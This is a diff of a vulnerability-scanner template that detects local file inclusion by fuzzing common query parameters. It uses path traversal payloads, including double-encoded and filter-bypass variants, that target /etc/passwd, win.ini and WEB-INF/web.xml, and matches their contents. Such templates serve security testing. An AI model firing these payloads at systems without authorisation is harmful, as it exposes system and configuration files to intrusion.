@@ -1,13 +1,15 @@
 id: lfi-keyed
 
 info:
-  name: Key LFI Detection
+  name: LFI Detection - Keyed
   author: pwnhxl
-  severity: high
+  severity: unknown
   reference:
     - https://owasp.org/www-community/attacks/Unicode_Encoding
-  tags: fuzzing-lfi,fuzzing-req,dast
-  
+  metadata:
+    max-request: 25
+  tags: dast,pathtraversal,lfi
+
 variables:
   fuzz: "../../../../../../../../../../../../../../../"
   fuzz_urlx2_encode: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f"
@@ -17,14 +19,15 @@ variables:
   fuzz_bypass_replace: ".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../"
   fuzz_bypass_replace_windows: '..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\'
   fuzz_bypass_waf_regx: "./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../"
-  
+
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
-      
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
     payloads:
-      lfi:
+      pathtraversal:
         - '{{fuzz}}etc/passwd'
         - '{{fuzz}}windows/win.ini'
         - '/etc/passwd%00.jpg'
@@ -50,20 +53,50 @@ http:
         - './WEB-INF/web.xml'
         - '../WEB-INF/web.xml'
         - '../../WEB-INF/web.xml'
-        
+
     fuzzing:
       - part: query
         mode: single
+        keys:
+          - cat
+          - dir
+          - action
+          - board
+          - date
+          - detail
+          - file
+          - download
+          - path
+          - folder
+          - prefix
+          - include
+          - page
+          - inc
+          - locate
+          - show
+          - doc
+          - site
+          - type
+          - view
+          - content
+          - document
+          - layout
+          - mod
+          - conf
+          - url
+          - img
+          - image
+          - images
         fuzz:
-          - "{{lfi}}"
-          
+          - "{{pathtraversal}}"
+
       - part: query
         mode: single
         values:
-          - "^(./|../|/)|(.html|.htm|.xml|.conf|.cfg|.log|.txt|.pdf|.doc|.docx|.xls|.csv|.png|.jpg|.jpeg|.gif)$"
+          - "^(./|../|/)|(.html|.htm|.xml|.conf|.cfg|.log|.txt|.pdf|.doc|.docx|.xls|.csv|.png|.jpg|.gif)$"
         fuzz:
-          - "{{lfi}}"
-          
+          - "{{pathtraversal}}"
+
     stop-at-first-match: true
     matchers-condition: or
     matchers:
@@ -71,18 +104,19 @@ http:
         part: body
         regex:
           - 'root:.*?:[0-9]*:[0-9]*:'
-          
+
       - type: word
         part: body
         words:
           - 'for 16-bit app support'
-          
+
       - type: regex
         part: body
         regex:
           - '(<web-app[\s\S]+<\/web-app>)'
-          
+
       - type: regex
         part: body
         regex:
           - '(<system.webServer[\s\S]+<\/system.webServer>)'
+# digest: 4a0a00473045022059c6031e484bc9217ee562035f4f2e5e73db531127b91c9e8aad3edff76da023022100cb58dd391005e94f6b98aaba243e4fa01e94eb4fc84cc679e85c26c1ed378c77:922c64590222798bb761d5b6d8e72950
